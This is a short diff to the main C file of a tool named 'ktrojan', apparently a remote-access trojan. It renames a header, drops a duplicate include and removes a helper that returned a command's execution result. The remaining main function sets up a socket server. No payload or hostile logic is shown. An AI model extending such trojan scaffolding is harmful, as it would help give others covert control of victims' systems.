@@ -1,11 +1,9 @@
 // Copyright (c) 2026 Kloveme
 // SPDX-License-Identifier: MIT
-#include "../include/server.h"
+#include "../include/ktorjan.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
-
-#include <stdio.h>
 
 void print_logo() {
     printf("\n");
@@ -39,13 +37,6 @@ void print_logo() {
     printf("\n");
 }
 
-
-char get_execute_result (struct execute_data* commad_data)
-{
-    char result_ = commad_data->commad_response;
-    return result_;
-}
-
 void printf_use_method() {
     printf("ktrojan <host> <port>");
 }
@@ -58,5 +49,4 @@ int main (int argc , char* argv[]) {
     struct sock_data sock_d = init_socket(&server_port, server_host);
     struct execute_data exec_d;
     start_server(&sock_d , &exec_d);
-    char result = get_execute_result(&exec_d);
 }
